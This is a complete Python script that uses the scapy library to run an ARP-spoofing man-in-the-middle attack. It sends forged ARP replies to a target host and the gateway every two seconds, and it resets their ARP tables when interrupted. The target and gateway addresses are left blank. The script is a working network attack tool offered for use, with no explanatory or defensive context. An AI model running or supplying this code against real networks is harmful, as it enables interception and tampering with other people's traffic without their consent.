import scapy.all as scapy
import time
import sys

def get_target_mac(ip_address):
    """Get the MAC address associated with the given IP address."""
    arp_request = scapy.ARP(pdst=ip_address)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc

def spoof_arp(target_ip, spoof_ip):
    """Spoof the ARP table of the target machine with a spoofed IP."""
    target_mac = get_target_mac(target_ip)
    arp_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(arp_packet, verbose=False)

def restore_arp(destination_ip, source_ip):
    """Restore the ARP tables of the target machine and the router."""
    destination_mac = get_target_mac(destination_ip)
    source_mac = get_target_mac(source_ip)
    arp_packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip)
    scapy.send(arp_packet, count=4, verbose=False)

target_ip = ""
gateway_ip = ""

try:
    sent_packets_count = 0
    while True:
        spoof_arp(target_ip, gateway_ip)
        spoof_arp(gateway_ip, target_ip)
        sent_packets_count += 2
        print("\r[+] Packets sent : " + str(sent_packets_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C ....... Resetting ARP tables....... Please wait.\n")
    restore_arp(target_ip, gateway_ip)
    restore_arp(gateway_ip, target_ip)


